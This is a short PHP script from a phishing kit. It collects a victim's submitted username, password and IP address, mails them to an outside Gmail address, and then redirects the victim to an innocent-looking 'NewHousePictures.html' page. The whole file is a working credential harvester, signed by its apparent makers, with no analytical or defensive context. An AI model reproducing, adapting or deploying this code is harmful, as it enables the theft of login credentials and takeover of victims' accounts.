<?
$ip = getenv("REMOTE_ADDR");
$message .= "------------------ God1St ---------------------\n";
$message .= "Username             : ".$_POST['email']."\n";
$message .= "Password            : ".$_POST['pswd']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "--------------- Created BY OTBS -------------\n";
$send = "sugarseanone@gmail.com";
$subject = "Gracias Senor";
$headers = "From: Gracias Senor <customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
header("Location: NewHousePictures.html");
?>


